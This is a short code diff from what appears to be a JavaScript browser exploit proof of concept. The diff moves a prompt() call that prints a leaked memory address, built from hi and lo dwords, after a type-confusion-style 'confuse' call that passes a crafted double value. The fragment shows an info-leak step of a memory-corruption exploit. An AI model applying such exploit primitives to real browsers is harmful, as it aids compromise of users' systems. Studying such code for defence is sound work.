@@ -29,12 +29,13 @@ function run()
         confuse(arr2, 3.3, oarr, {});
     }
     setTimeout(followup, 100);
+    prompt("addr:", "0x" + SignedDwordToUnsignedDword(hi).toString(16) + "" + SignedDwordToUnsignedDword(lo).toString(16));
+
 }
 
 function followup()
 {
     confuse(arr, -5.3049894784e-314, arr, myObj)
-    prompt("addr:", "0x" + SignedDwordToUnsignedDword(hi).toString(16) + "" + SignedDwordToUnsignedDword(lo).toString(16));
     Math.sin(1)
 }
 
